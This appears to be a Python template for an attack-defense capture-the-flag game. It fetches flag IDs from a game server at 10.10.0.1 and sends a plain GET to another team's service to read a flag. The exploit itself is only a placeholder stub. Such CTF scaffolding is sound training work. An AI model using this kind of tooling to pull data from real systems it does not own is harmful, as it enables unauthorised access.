#!/usr/bin/env python3
import random
import string
import requests # Import the requests library
import os
import sys
import json
import random
import re
from pwn import *
import secrets

def generate_random_string(length=10):
  characters = string.ascii_letters + string.digits
  random_string = ''.join(random.choice(characters) for i in range(length))
  return random_string

def generate_secure_random_string(length=10):
    characters = string.ascii_letters + string.digits
    secure_random_string = ''.join(secrets.choice(characters) for _ in range(length))
    return secure_random_string

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)


# -------------------------------
# Exploit function
# -------------------------------

def expl(host,flagid):
    text = requests.get(f"{host}/{flagid}").text
    print(text)



IP_ADDRESS = sys.argv[1] if len(sys.argv) > 1 else "10.60.0.1" # Default IP address if not provided
ROUND = sys.argv[2] if len(sys.argv) > 2 else '0' # 0 stands for last round
TEAM_ID = IP_ADDRESS.split(".")[2]

HOST = "http://{}:3000"
SERVICE = "service_name"

try:
    flag_ids = requests.get(f'http://10.10.0.1:8081/flagIds?team={TEAM_ID}').json()
    last_round = list(flag_ids[SERVICE][TEAM_ID])[-1]
    round = last_round if ROUND == '0' else ROUND
    
    flagid = flag_ids[SERVICE][TEAM_ID][round]
    print("flagId: ", flagid)

    expl(HOST.format(IP_ADDRESS),flagid)

except Exception as e:
    print(e, file=sys.stderr)